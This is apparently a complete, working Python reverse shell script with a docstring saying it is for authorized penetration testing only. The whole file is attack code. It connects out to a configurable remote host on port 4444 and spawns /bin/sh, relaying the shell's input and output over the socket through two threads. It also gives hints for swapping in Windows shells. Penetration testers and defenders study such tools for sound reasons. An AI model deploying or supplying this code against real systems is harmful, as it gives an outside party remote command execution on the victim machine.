#!/usr/bin/env python3
"""
Reverse Shell Payload for Controlled Testing

WARNING: This script is intended solely for authorized penetration testing 
in controlled environments. Unauthorized use is strictly prohibited and may 
be illegal.
"""

import socket
import subprocess
import sys
import threading

# ===== Configuration =====
# Replace these values with the controlled test server's details.
REMOTE_HOST = "example.com"   # The target URL or IP for outbound connection.
REMOTE_PORT = 4444            # The designated port on the test server.
BUFFER_SIZE = 1024

# ===== Function Definitions =====

def establish_connection():
    """
    Attempt to create an outbound TCP connection to the specified remote host.
    Returns the connected socket or None if connection fails.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((REMOTE_HOST, REMOTE_PORT))
        return s
    except Exception as e:
        print(f"[ERROR] Connection failed: {e}", file=sys.stderr)
        return None

def start_shell(connection):
    """
    Spawn a shell on the target system and redirect its I/O to the given connection.
    This effectively creates a reverse shell.
    """
    try:
        # For Unix-like systems; for Windows replace "/bin/sh" with "cmd.exe" or "powershell.exe"
        shell = subprocess.Popen(
            "/bin/sh",
            shell=True,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,   # Use text mode for string I/O
            bufsize=0
        )
    except Exception as e:
        try:
            connection.sendall(f"[ERROR] Failed to spawn shell: {e}\n".encode())
        except Exception:
            pass
        connection.close()
        return

    # Thread to forward data from the remote connection to the shell's stdin.
    def forward_input():
        try:
            while True:
                data = connection.recv(BUFFER_SIZE)
                if not data:
                    break
                shell.stdin.write(data.decode())
                shell.stdin.flush()
        except Exception:
            pass  # Input forwarding error; typically occurs on disconnect.

    # Thread to forward the shell's stdout to the remote connection.
    def forward_output():
        try:
            while True:
                output = shell.stdout.readline()
                if output == "":
                    break
                connection.sendall(output.encode())
        except Exception:
            pass  # Output forwarding error.

    # Start the threads for bidirectional communication.
    input_thread = threading.Thread(target=forward_input, daemon=True)
    output_thread = threading.Thread(target=forward_output, daemon=True)
    input_thread.start()
    output_thread.start()

    # Wait for both threads to finish.
    input_thread.join()
    output_thread.join()

    # Clean up the connection and the shell process.
    connection.close()
    shell.terminate()

def main():
    connection = establish_connection()
    if connection:
        start_shell(connection)
    else:
        print("[ERROR] Unable to establish outbound connection. Exiting.", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
